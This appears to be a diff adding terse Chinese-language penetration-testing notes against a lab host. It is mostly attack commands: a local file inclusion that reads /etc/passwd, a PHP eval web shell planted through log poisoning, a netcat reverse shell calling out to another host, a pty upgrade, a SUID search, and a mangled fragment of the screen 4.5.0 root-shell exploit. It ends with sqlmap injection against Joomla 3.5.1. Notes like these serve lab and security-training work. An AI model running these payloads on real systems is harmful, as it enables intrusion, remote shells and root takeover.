@@ -23,3 +23,32 @@ http://192.168.10.139/thanklyou.php?file=footer.php
 http://192.168.10.139/thanklyou.php?file=/etc/passwd
 file=/var/log/nginx/access.log
 日志挂马 file=<?php @eval($_POST[8]);?>
+
+
+提权
+suid
+kali nc -lvvp 1234
+蚁剑 反向链接 nc -e /bin/bash 192.168.10.123 1234
+交互状态 python -c 'import pty;pty.spawn("/bin/bash")'
+suid文件 find / -perm -u=s -type f 2>/dev/null [/bin/screen-4.5.0]
+查看漏洞利用脚本 searchsploit screen 4.5.0
+searchsploit -m 41154
+cat 41154.sh
+#include <stdio.h>#include<sys/types.h>#include <unistd.h>
+attributeconstructorvoid dropshell(void){chown("/tmp/rootshell"，0，0);chmod("/tmp/rootshell"，04755);unlink("/etc/ld.so.preload");printf("[+] done!\n");
+EOF
+/tmp/libhax.c 
+上传3个文件 重命名
+chmod +X xx.sh
+# root 
+
+
+
+joomla
+joomlachina.cn 
+joomla3.5.1  
+phpstudy/www/ 
+部署 漏扫 bp sqlmap post 验证漏洞 payload 
+sqlmap.py -r payload.txt -p filter[category_id]
+类型转换  预处理 设备
+cve-2017-7986
